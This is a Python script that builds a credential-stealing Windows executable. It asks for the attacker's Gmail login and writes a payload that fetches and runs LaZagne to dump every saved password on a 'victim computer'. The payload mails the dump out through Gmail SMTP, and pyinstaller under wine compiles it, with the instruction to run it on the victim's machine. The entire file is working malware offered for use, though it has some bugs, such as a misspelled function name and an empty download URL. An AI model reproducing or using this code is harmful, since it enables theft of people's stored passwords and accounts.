#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests, subprocess, smtplib, os, tempfile, sys
from colorama import Fore

          
print(Fore.RED+"[+] "+Fore.WHITE+"Get All the Saved password from victim computer!")
print(Fore.GREEN+"[+]Enter Gmail Username / password to get Report")
usern = raw_input(Fore.GREEN+"Username >> "+Fore.WHITE)
userp = raw_input(Fore.GREEN+"Password >> "+Fore.WHITE)
file_name = raw_input(Fore.GREEN+"File Name>> "+Fore.WHITE)
os.chdir("/root/.wine/drive_c/Python27/Scripts/")

with open(file_name+".py",'w') as out:
     out.write("#!/usr/bin/env python")
     out.write("\nimport requests, subprocess, smtplib, os, tempfile")
     out.write("\nEMAIL = \"" + usern + "\"")
     out.write("\nPASSWORD = \"" + userp + "\"")
     out.write('''\n
def downlad(url):
     get_response = requests.get(url)
     file_name = url.split("/")[-1]
     with open(file_name, "wb") as output:
          output.write(get_response)

def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, password)
     server.sendmail(email, email, message)
     server.quit()

temp = tempfile.gettempdir()
os.chdir(temp)
download("")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail(EMAIL, PASSWORD, result)
os.remove("laZagne.exe")     
''')
try:
     os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller '+file_name+'.py --onefile')
     os.system('mv dist/'+file_name+'.exe /root/'+file_name+'.exe')
     os.system('rm '+file_name+'.py')
     os.system('rm '+file_name+'.spec')
     print(Fore.GREEN+"[+]File Saved to /root/"+file_name+".exe")
     print("")
     user = raw_input(Fore.GREEN+"[+] Run it on the Victim's Computer")
except KeyboardInterrupt:
     sys.exit()
